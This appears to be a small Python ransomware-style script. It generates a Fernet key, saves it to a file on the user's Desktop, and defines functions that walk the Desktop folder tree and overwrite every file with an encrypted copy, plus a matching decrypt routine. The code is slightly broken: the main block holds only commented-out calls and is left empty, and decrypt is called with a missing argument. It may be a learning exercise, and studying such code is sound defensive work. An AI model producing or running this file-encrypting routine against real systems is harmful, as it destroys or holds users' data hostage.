import os
from cryptography.fernet import Fernet

key=Fernet.generate_key()
os.chdir(os.getenv("USERPROFILE").replace('\\','/') + "/Desktop/")

with open(os.getcwd().replace('\\','/')+"/naber.txt","wb") as file:
    file.write(key)

os.chdir(os.getenv("USERPROFILE").replace('\\','/') + "/Desktop")

def encrypt(path):
    for root, subdirectories, files in os.walk(path):
        os.chdir(root)
        for file in files:
            if file=="naber.txt":
                   continue
            with open(file,"rb") as naber:
                    encrypted_file=Fernet(key).encrypt(naber.read())
            with open(file,"wb") as file:
                    file.write(encrypted_file)


def decrypt(path,token):
    for root, subdirectories, files in os.walk(path):
        os.chdir(root)
        for file in files:
            if file=="naber.txt":
                   continue
            with open(file,"rb") as naber:
                encrypted_file=Fernet(token).decrypt(naber.read())
            with open(file,"wb") as file:
                    file.write(encrypted_file)


if __name__=="__main__":
    #encrypt(os.getcwd())
    #decrypt(os.getcwd())
